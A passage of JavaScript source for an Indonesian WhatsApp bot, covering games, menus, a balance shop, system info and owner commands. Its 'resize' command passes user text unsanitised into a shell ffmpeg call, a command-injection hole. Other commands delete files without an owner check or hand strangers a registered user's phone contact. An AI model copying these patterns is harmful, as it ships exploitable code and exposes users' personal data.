game.cekWaktuTL(atak, tebaklirik, butlirik)

if (game.isTebakLirik(from, tebaklirik)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTL(from, tebaklirik)}`
atak.sendButMessage(from, teks, fake, butlirik) 
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
return
}
if (budy.toLowerCase().includes(game.getJawabanTL(from, tebaklirik)) && !itsMe){
var htgml = randomNomor(1500)
addBalance(senderNumber, htgml)
teks = `*GAME TEBAK LIRIK*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTL(from, tebaklirik)}\nHadiah : Rp ${htgml.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebaklirik`
atak.sendButMessage(from, teks, fake, butlirik) 
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
}else if(type === 'conversation' && !command && !ridho.key.fromMe){
reply(jawabansalah)
}
} 

//Game siapa aku
const butaku = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}siapaaku`, buttonText: { displayText: Mainlagi }, type: 1 } ];      
game.cekWaktuSA(atak, siapaaku, butaku)
   
if (game.isSiapaAku(from, siapaaku)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanSA(from, siapaaku)}`
atak.sendButMessage(from, teks, fake, butaku) 
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
return
}
if (budy.toLowerCase().includes(game.getJawabanSA(from, siapaaku))){
var htgmu = randomNomor(1500)
addBalance(senderNumber, htgmu)
teks = `*GAME SIAPAKAH AKU*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanSA(from, siapaaku)}\nHadiah : Rp ${htgmu.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}siapakahaku`
atak.sendButMessage(from, teks, fake, butaku) 
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
}else if(type === 'conversation' && !command && !ridho.key.fromMe){
reply(jawabansalah)
}
}



  
//add to dashboard
if(isCmd) Succes(toFirstCase(command), dash, allcommand)
// ==========================================================\\
try{
switch(command) {
case 'verify':
case 'daftar':
if (isRegist) return setReply("sudah register kak")
addRegist(senderNumber, pushname)
const kontol = `─── 「 *REGISTERED SUCCESS* 」───
• NAMA : ${pushname}
• NOMOR : ${senderNumber}
• TANGGAL : ${calender}
`
setReply(kontol)
break
case 'menu':
if (!isRegist) return onlyRegist()
let menunya = allmenu(getLimit, senderNumber, getBalance, isPremium, thisHit, publik, sender, prefix, pushname)
let fiturnya = fitur(prefix)
let mok = [
{"buttonId": `${prefix}owner`,"buttonText": {"displayText": `ᴏᴡɴᴇʀ`},"type": "RESPONSE"},
{"buttonId": `${prefix}infobot`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛ`},"type": "RESPONSE"},
{"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛ`},"type": "RESPONSE"}]
const muk = [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `${nomerOwner}` } },
{ urlButton: { displayText: `Source Code`, url : `https://xxx/ah ah` } },
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `${prefix}rules` } },
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛ`, id: `${prefix}infobot` } },
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛ`, id: `${prefix}sewa` } }
]
let options1 =
{ forward,
externalAdReply: {
showAdAttribution: true, 
title: botName, 
body: fake,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnail: ofrply,
sourceUrl: `https://wa.me/${nomerOwner}`
}
}
if(setmenu == "document"){
atak.sendButDoc(from, menunya,readmore+fiturnya,fs.readFileSync('./media/image/thumbnaildokumen.jpg'), mok, options1,{quoted: setQuoted})
} else if(setmenu == "location"){
atak.sendButLoc(from, menunya,""+readmore+fiturnya+"\n"+fake,thumb, mok, options1)
} else if(setmenu == "image"){
atak.sendButImage(from, menunya, readmore+fiturnya, thumb,mok) 
} else if(setmenu == "image2"){
atak.send5ButImg (from, menunya+readmore+"\n"+fiturnya,fake, thumb, muk) 
} else if(setmenu == "gif"){
atak.send5ButGif (from, menunya+readmore+"\n"+fiturnya,fake, fs.readFileSync('./media/video/video.mp4'), muk,fs.readFileSync('./media/image/fake gif.jpeg'),{quoted: ridho}) 
} else if(setmenu == "location2"){
atak.send5ButLoc(from, menunya+readmore+"\n"+fiturnya,fake, thumb, muk) 
} else if(setmenu == "katalog"){
atak.sendKatalog(from, "ALL MENU BOT", menunya+readmore+"\n"+fiturnya, thumb, {quoted: setQuoted})
}
break
case 'del':
if (!isRegist) return onlyRegist()
if (mentionByReply == botNumber) {
atak.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: ridho.quoted.id, participant: mentionByReply } })
} else  {
setReply("Reply pesan bot nya")
}
break
case 'react': {
if (!isRegist) return onlyRegist()
if(!q) return setReply(`Contoh ${prefix+command} 😝`)
let reactionMessage = {
react: {
text: args[0],
key: { remoteJid: from, fromMe: true, id: quoted.id }
}
}
atak.sendMessage(from, reactionMessage)
}
break
case 'info':{
if (!isRegist) return onlyRegist()
const si = require('systeminformation');
let OsInfo = await si.osInfo()
let System = await si.system()
let Cpu = await si.cpu()
let Mem = await si.mem()
let {platform,distro,release,codename,kernel,arch,hostname,fqdn,codepage,logofile} = OsInfo
let { manufacturer,brand,vendor,family,model,stepping,revision,voltage,speed,speedMin,speedMax,governor,cores,physicalCores,processors} = Cpu
let { total,free,used,active,available,buffers,cached,slab,buffcache} = Mem

let teks =`System Information`
teks +=`

Uptime : ${kyun(os.uptime())}

*OS INFO*
Platform: ${platform}
Distro: ${distro}
Release: ${release}
Codename: ${codename}
Kernel: ${kernel}
Arch: ${arch}
Hostname: ${hostname}
Codepage: ${codepage}

*CPU INFO*
Manufacturer: ${manufacturer}
Brand: ${brand}
Vendor: ${vendor}
Family: ${family}
Model: ${model}
Speed: ${speed} Ghz
Governor: ${governor}
Cores: ${cores}
PhysicalCores: ${physicalCores}
Processors: ${processors}

*MEMORY INFO*
Memory : ${FileSize(used)}/${FileSize(total)} 
Free : ${FileSize(free)}
Cached: ${FileSize(cached)}
`
setReply(teks)
}    
break
case 'dashboard':{
if (!isRegist) return onlyRegist()
let teks =`
*Dashboard*
        
Runtime : ${runtime(process.uptime())}
Total Hit : ${thisHit.toLocaleString()}`
let fall ="*Commands Today*  \n"
let totalFail =[]
let totalSuc = []
let total = 0
let tot = 0
await dash.map(async function(e, i){
fall += "*•*"+` ${e.cmd} : ${e.succes+e.failed} \n`   
await totalFail.push(e.failed)
await totalSuc.push(e.succes)
});
for(let i = 0; i < totalFail.length; i++){
total += totalFail[i]
} 
for(let a = 0; a < totalSuc.length; a++){
tot += totalSuc[a]
} 
let akoh = `Total : ${dash.length} used`
let tod ="*Command Failed*\n"
let filteredArray = await dash.filter(item => item.failed > 0 )
await filteredArray.map(async function(e, i){
tod += "*•*"+` ${e.cmd} : ${e.failed} \n`   
});
let aw = `Total : ${filteredArray.length} failed`    
let tekz = teks+"\n\n"+fall+"\n"+akoh+"\n\n"+"*Command Status* \n"+" *•* Succes : "+tot+"\n"+" *•* Failed : "+total+"\n\n"+tod+"\n\n"
setReply(tekz)                                                        
}
break
case 'sewa':{
if (!isRegist) return onlyRegist()
let { dada } = require("../message/sewabot.js")
let teks = dada(prefix, pushname, ucapanWaktu)      
let gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]  
atak.sendButLoc(from, teks,fake, thumb, gbutsan)                          
}
break
case 'status':{
if (!isRegist) return onlyRegist()
let osu = require('node-os-utils')
try {
let NotDetect = 'Not Detect'
let old = performance.now()
let cpu = osu.cpu
let cpuCore = cpu.count()
let drive = osu.drive
let mem = osu.mem
let netstat = osu.netstat
let OS = osu.os.platform()
let cpuModel = cpu.model()
let cpuPer
let p1 = cpu.usage().then(cpuPercentage => {
var cpuPer = cpuPercentage
}).catch(() => {
var cpuPer = NotDetect
})
let driveTotal, driveUsed, drivePer
let p2 = drive.info().then(info => {
driveTotal = (info.totalGb + ' GB'),
driveUsed = info.usedGb,
drivePer = (info.usedPercentage + '%')
}).catch(() => {
driveTotal = NotDetect,
driveUsed = NotDetect,
drivePer = NotDetect
})
let ramTotal, ramUsed
let p3 = mem.info().then(info => {
ramTotal = info.totalMemMb,
ramUsed = info.usedMemMb
}).catch(() => {
ramTotal = NotDetect,
ramUsed = NotDetect
})
let netsIn, netsOut
let p4 = netstat.inOut().then(info => {
netsIn = (info.total.inputMb + ' MB'),
netsOut = (info.total.outputMb + ' MB')
}).catch(() => {
netsIn = NotDetect,
netsOut = NotDetect
})
await Promise.all([p1, p2, p3, p4])
await setReply(`_Testing ${command }..._`)
let _ramTotal = (ramTotal + ' MB')
let neww = performance.now()
let teks =`
*「 Status 」*

OS : *${OS}*
CPU Model : *${cpuModel}*
CPU Core : *${cpuCore} Core*
CPU : *${cpuPer? `${cpuPer}%`:"Not Found"}*
Ram : *${ramUsed} / ${_ramTotal}(${/[0-9.+/]/g.test(ramUsed) &&  /[0-9.+/]/g.test(ramTotal) ? Math.round(100 * (ramUsed / ramTotal)) + '%' : NotDetect})*
Drive : *${driveUsed} / ${driveTotal} (${drivePer})*
Ping : *${Math.round(neww - old)} ms*
Internet IN : *${netsIn}*
Internet OUT : *${netsOut}*
`
let mok = [
{"buttonId": `${prefix}infobot`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛ`},"type": "RESPONSE"},
{"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛ`},"type": "RESPONSE"}]
atak.sendButLoc(from, teks,fake,thumb, mok)
} catch (err) {
setReply(err)
}
}
break
case 'ping': {
if (!isRegist) return onlyRegist()
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
setReply(respon)
}
break
case 'owner':
if (!isRegist) return onlyRegist()
atak.sendContact(from, nomerOwner, ownerName)
break
case 'readmore':{
if (!isRegist) return onlyRegist()
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
if (!q.includes('|')) return  setReply("Penggunaan teks| teks")
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
setReply(`${text1}${readmore}${text2}`)
}
break
case 'infobot':{       
if (!isRegist) return onlyRegist()
var groups = totalchat.filter(v => v.endsWith('g.us'))
var privat = totalchat.filter(v => v.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
var ram3 =`${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`
let uptime = process.uptime();
const timestampu = speed();
var total = math(`${groups.length} ${privat.length}`)
var wa_version = atak.waVersion
var mcc = "Error"
var mnc = "Error"
var os_version = "Error"
var device_manufacturer = "Error"
var device_model = "Error"
let gender ="Female"
let nomerOwner =`Ownerin.split("@")[0]`
let menunya =`
「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧 」

*▸* Nama : ${botName}
*▸* Gender : ${gender}
*▸* Private Chat : ${privat.length}
*▸* Group Chat : ${groups.length}
*▸* Total Chat : ${totalchat.length}
*▸* Speed : ${latensi.toFixed(4)} second
*▸* Penggunaan Ram : ${ram2}
*▸* Hostname : ${os.hostname()}
*▸* Platform : ${os.platform()}
*▸* Device Model: ${device_model}
*▸* Device Manufactur : ${device_manufacturer}
*▸* Wa Version: ${wa_version}
*▸* Os Version: ${os_version}
*▸* Owner : ${nomerOwner}
*▸* Tgl pembuatan : 25 Juli 2021
*▸* Tgl release : 29 September 2021
*▸* Tgl sekarang : ${calender}
*▸* Image : Girl Front Line G11
*▸* Voice : Nina kawai

*▸* SCRIPT BY
   Decode Denpa
   X-None Team   
   Dittaz
   Ridho

*▸* FEATURE  BY  
   Decode Denpa
   Fernazer
   X-None Team
   Ridho
   Dika Ardnt
`
let info = thumb
let options2 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: thumb, mediaUrl:`https://www.instagram.com/reel/CZ2bMRkgHCR/?utm_medium=copy_link`}}}
let gbutsan = [{buttonId: 'YOUTUBE', buttonText: {displayText: `ʏᴏᴜᴛᴜʙᴇ`}, type: 1},
{buttonId: 'RULES', buttonText: {displayText: `ʀᴜʟᴇs`}, type: 1}]         
atak.sendButImage(from, menunya,fake, thumb, gbutsan)      
} 
break 
case 'runtime':
if (!isRegist) return onlyRegist()
setReply(`⏰ Bot aktif selama ${runtime(process.uptime())}`)
break
case 'speed':
if (!isRegist) return onlyRegist()
setReply(`Speed: ${latensi.toFixed(4)} Second`)
break
case 'ss':{
if (!isRegist) return onlyRegist()
if(!q) return setReply("Masukan Link")
if(!isUrl(args[0]) && !args[0].includes('www.')) return reply("Link error");
if (args.length < 1) return setReply('Urlnya mana om')
let teks = q
let ana = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
let buff = await getBuffer(ana.screenshot)
await atak.sendMessage(from, {caption : `Link: ${teks}`, image: buff}, {quoted: ridho})
}
break
case 'speedtest': {
if (!isRegist) return onlyRegist()
let cp = require('child_process')
let { promisify } = require('util')
let exec2 = promisify(cp.exec).bind(cp)
await setReply("_Testing Speed..._")
let o
try {
o = await exec2('python speed.py')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
if (stdout.trim()) setReply(stdout)
if (stderr.trim()) setReply(stderr)
}
}
break
case 'chat': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply( 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
if (args[0] === 'mute') {
atak.chatModify({ mute: 'Infinity' }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unmute') {
atak.chatModify({ mute: null }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'archive') {
atak.chatModify({  archive: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
atak.chatModify({ archive: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'read') {
atak.chatModify({ markRead: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unread') {
atak.chatModify({ markRead: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'delete') {
atak.chatModify({ clear: { message: { id: ridho.quoted.id, fromMe: true }} }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (q.startsWith("+") || q.startsWith('08') || q.startsWith('62') ){
if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
var org = q.split("|")[1];
atak.sendMessage(nomor+'@s.whatsapp.net',{text: org})   
setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)           
}
}
break
case 'rules':{
if (!isRegist) return onlyRegist()
let teks =`
Syarat dan Ketentuan menggunakan *${botName}*

1. Nama dan nomer user ${botName}
     akan Kami simpan di dalam 
     server selama bot aktif
     
2. Data akan di hapus ketika bot Offline
     atau di hapus oleh Owner Bot

3. Kami tidak menyimpan gambar, 
     video, file, audio, dan dokumen 
     yang kamu kirim ke ${botName}
     
4. Kami tidak akan pernah meminta users 
     untuk memberikan informasi pribadi
     
5. Jika menemukan Bug/Error silahkan 
     langsung lapor ke Owner atau Developer
     atau bisa juga memakai fitur _*reportbug*_
     
6. Beberapa fitur mungkin ada yang error, 
     jadi tunggu sampai developer 
     meperbaiki fitur tersebut
         
8. Bot ini sudah di lengkapi dengan
     fitur _*Auto Report Bug*_ jika terjadi
     error maka bot akan auto report ke
     developer, terkecuali error yang
     menyebabkan bot mati, maka user
     harus lapor ke developer
     
7. Bot ini juga sudah di lengkapi dengan 
     Fitur Anti Spam jika kamu terdeteksi 
     melakukan spam, maka Bot tidak
     akan menanggapi kamu selama 20 detik
    
9. User dilarang keras menelpon bot!
     jika melanggar maka kamu akan terkena 
     banned,block dan dikirim bug

10. Bot tidak akan menanggapi user yang
       meminta untuk di save nomernya`

let mok = [
{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
{"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"}]
atak.sendButImage(from, teks, fake, thumb, mok, {quoted: ridho})             
}
break
case 'kalkulator':
if (!isRegist) return onlyRegist()
const matematik = require('mathjs')
try{
let atak = q.replace("x","*")
let nunu = matematik.evaluate(atak)
let teks = `${q} = ${nunu}`
setReply(teks)
} catch (err){
setReply( 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
break
case 'listpc': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let i of anu) {
let nama = store.messages[i].array[0].pushName
teks += `◉ Nama : ${nama}\n◉ User : @${i.split('@')[0]}\n◉ Chat : https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
atak.sendTextWithMentions(from, teks, ridho)
}
break
case 'listgc': {
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
let getGroups = await atak.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata2 = await atak.groupMetadata(i)
teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
atak.sendTextWithMentions(from, teks, ridho)
}
break
case 'inspect':{
if (!isRegist) return onlyRegist()
const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let code = q.match(rex1);
if (code === null) return  setReply("No invite url detected.");
code = code[0].replace("chat.whatsapp.com/", "");
let { id, subject,creator,creation,desc,descId } = await atak.inspectLink(code).catch(async () => {
return setReply("Invalid invite url.");
});
let text =
`Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
Create At: ${new Date(creation * 1000).toLocaleString()}` +`${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`
setReply(text)
}
break
case 'resize':
if (!isRegist) return onlyRegist()
if (isQuotedImage || isImage) {
if(!q) return setReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
onlyWait()
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await atak.sendMessage(from, {mimetype: 'image/jpeg', image: buffer453, caption: `Nih ${q}`}, { quoted: ridho })
fs.unlinkSync(ran)
})
} else {
setReply("Reply Imagenya")
}
break
case 'kontak':
case 'contact':
if (!isRegist) return onlyRegist()
if (!isRegist) return onlyRegist()
var nice = await atak.getName(Input)
if (Input) {
var nice = await atak.getName(Input)
await atak.sendContact(from, `${Input.split("@")[0]}`, nice)     
} else setReply("Tag atau Reply usernya")
break
case 'caridoi':
case 'cariteman':
if (!isRegist) return onlyRegist() 
let teman = pickRandom(register) 
let namTemen = teman.name
let nomerTemen = teman.id
setTimeout( () => {
setReply("Sedang mencari....")
},1000)  
setTimeout( () => {
setReply("Berhasil mendapatkan satu org")
},5000)  
setTimeout( () => {           
atak.sendContact(from, nomerTemen, namTemen)
},9000)  
break
case 'profile':
case 'me': {
if (!isRegist) return onlyRegist()
let ppimg = await atak.profilePictureUrl(sender, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let sol = await atak.fetchStatus(sender)
let stst = sol.status == 401 ? '' : sol.status
let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
let hituser = gethitUser(senderNumber)
let persenya =`${userPersen}`
let atak =`${userExp}/${requiredExp}`
if(isOwner){
var prmm = isPremium ? `Unlimited`:'Not Premium'
} else {
var   prmm = isPremium ? `${cekprm.days} Hari ${cekprm.hours} Jam ${cekprm.minutes} Menit ${cekprm.seconds} Detik`:'Not Premium'
}
let teks = `*]────「 Profile User 」────[*

🆔 Nama : ${pushname} 
💳 Saldo  : Rp ${getBalance(senderNumber).toLocaleString()}
✅ Verified : ${userVerified}
📇 Status : ${isPremium ? 'Premium':'Free'}
🧬 Level : ${userLevel}
🔰 Pangkat : ${userLeveling(userLevel)}
⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%
♻️ Total Exp : ${atak}
📟 User Hit : ${hituser}
🤖 Status Bot : ${isOwner ? 'Owner':'User'}
🕔 Expired : ${prmm}
📉 Limit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber)}`}
📈 Limit Game : ${cekGLimit(senderNumber, gcount)}/${gcounti.user}
📲 No : wa.me/${sender.split("@")[0]}
🧸 Bio : ${stst}`
let its = await getBuffer (ppimg)
const canvacord = require("canvacord");
let image3 = new canvacord.Rank()
.setAvatar(its)
.setCurrentXP(math(userExp))
.setRequiredXP(requiredExp)
.setStatus("online")
.setProgressBar("#FFFFFF", "COLOR")
.setBackground( "COLOR","#141414")
.setCustomStatusColor("#ff1a8c")  
.setUsername(`EXP: ${persenya.split(".")[0]}%,`)
.setLevel(userLevel )
.setRank(4)
.setOverlay("#3d3d3d")
.setDiscriminator("0007");
let foto = await getRandom(".png")
image3.build()
.then(async data => {
await canvacord.write(data,foto);
let gambar = await fs.readFileSync(foto)
let butprofile = [{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 },{ buttonId: `${prefix}claim`, buttonText: { displayText: `ᴄʟᴀɪᴍ` }, type: 1 } ];          
let buttonMessage = {
image:gambar,
caption: teks,
footer: fake,
buttons: butprofile,
headerType: 4
}
await atak.sendMessage(from, buttonMessage)
await fs.unlinkSync(foto)
});
} 
break
case 'getallstik':{
if (!isRegist) return onlyRegist()
for(let i of setiker){
let buffer = fs.readFileSync(`./media/sticker/stick/${i}.webp`)
await atak.sendMessage(from, {sticker: buffer})
await sleep(1000)
}
}
break
case 'limit':
case 'ceklimit': 
if (!isRegist) return onlyRegist()
setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber)}`}\nLimit Game : ${cekGLimit(senderNumber, gcount)}/${gcount}\nSaldo : Rp ${getBalance(senderNumber).toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
break
case 'buylimit':{
if (!isRegist) return onlyRegist()
if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = Rp1000`)
if (q.includes('-')) return setReply(`Jangan menggunakan -`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
let ane = Number(math(q) * 1000)
if (getBalance(senderNumber) < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(senderNumber, ane)
tambahLimit(senderNumber, math(q))
setReply(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${getBalance(senderNumber).toLocaleString()}\nSisa Limit : ${getLimit(senderNumber)}`)
}
break
case 'claim':{   
if (!isRegist) return onlyRegist()
if (checkClaim(senderNumber, _claim)) return setReply(mess.claimOn+getClaim(senderNumber, _claim))
let htgm6 = randomNomor(2500)
let htgm7 = randomNomor(20)
addBalance(senderNumber, htgm6)
tambahLimit(sender, htgm7)
addUserClaim("1d", timeWib, pushname, senderNumber, _claim)
setReply(`*── 「 CLAIM  」 ──*

Selamat kamu mendapatkan *${htgm7}* Limit & Uang Rp *${htgm6.toLocaleString()}* 
Dari claim harian`)
}
break
case 'shop':{
if (!isRegist) return onlyRegist()
let teks = `
*]────「 SHOP」────[*

Halo ${pushname} 
Saldo : Rp ${getBalance(senderNumber).toLocaleString()}

• List Harga
1 Limit : Rp 1000
1 Limit Game : Rp 750
1 Jam Premium : Rp 50,000

NOTE :
Untuk membeli Limit ketik ${prefix}buylimit jumlah limit
Contoh : ${prefix}buylimit 10

Untuk membeli Limit Game ketik ${prefix}buyglimit jumlah limit
Contoh : ${prefix}buyglimit 10`
setReply(teks)
}
break 
case 'cekprem': case 'cekpremium':
if (!isRegist) return onlyRegist()
if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
setReply(premiumnya)
break
case 'tr': {
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let err = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages

Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()
let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && ridho.quoted && ridho.quoted.text) text = ridho.quoted.text
let result
try {
result = await translate(`${text}`, {
tld,
to: lang,
})
} catch (e) {
result = await translate(`${text}`, {
tld,
to: defaultLang,
})
setReply(err)
} finally {
setReply(result[0])
}
}
break
case 'delsampah':{
let path = require('path');
let directoryPath = path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return setReply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("webp")    )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
if(filteredArray.length == 0) return setReply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
}) 
setReply(teks) 
await sleep(2000)
setReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(file)
});
await sleep(2000)
setReply("Berhasil menghapus semua sampah")
});
}
break  
case 'ranking':
case 'rank':{
function perbandinganSkor(key, order = 'asc') {
return function innerSort(a, b) {
if (!a.hasOwnProperty(key) || !b.hasOwnProperty(key)) {
return setReply("property doesn't exist on either object")
}
const varA = (typeof a[key] === 'string')? a[key].toUpperCase() : a[key];
const varB = (typeof b[key] === 'string')? b[key].toUpperCase() : b[key];
let comparison = 0;
if (varA > varB) {
comparison = 1;
} else if (varA < varB) {
comparison = -1;
}
return ((order === 'desc') ? (comparison * -1) : comparison);
};
}
let atak = user.sort(perbandinganSkor('level', 'desc'));
let usernye = `💬「 RANK USER 」\n\nJumlah : ${atak.length}\n\n`
atak.map(function(e, i){
usernye += (i+1)+`.Nama : ${e.name}\n    Level : ${e.level}\n\n`            
});
setReply(usernye)
}
break
//================================================================================\\
case 'join':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Kirim perintah ${command} _linkgrup_`)
var url = args[1]
let ano = q.split('https://chat.whatsapp.com/')[1]
await atak.groupAcceptInvite(ano)
setReply("Sukses join group")
}
break
case 'bc': 
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (args.length < 2) return reply(`Masukkan isi pesannya`)
var data = await store.chats.all()
for (let i of data) {
await atak.sendMessage(i.id, { text: `${q}\n\n_*BROADCAST MESSAGE*_` })
await sleep(1000)
}
break
case 'bcgc':{
if (!isRegist) return onlyRegist()
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
